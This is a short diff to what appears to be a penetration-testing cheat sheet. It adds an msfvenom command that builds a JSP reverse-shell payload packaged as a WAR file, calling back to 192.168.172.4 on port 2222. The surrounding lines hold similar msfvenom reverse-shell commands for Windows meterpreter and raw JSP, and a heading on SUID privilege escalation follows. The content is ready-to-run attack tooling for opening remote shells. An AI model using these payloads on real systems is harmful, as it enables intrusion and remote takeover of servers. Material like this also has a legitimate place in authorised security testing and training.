@@ -95,6 +95,8 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.172.4 lport=2222 -e x8
 
 # jsp reverse shell payload
 msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.172.4 lport=2222 -f raw > cmd.jsp
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.172.4 LPORT=2222 -f war > shell.war
 ```
 ## Miscellaneous Techniques
 ### Checking SUID files available in the system by running
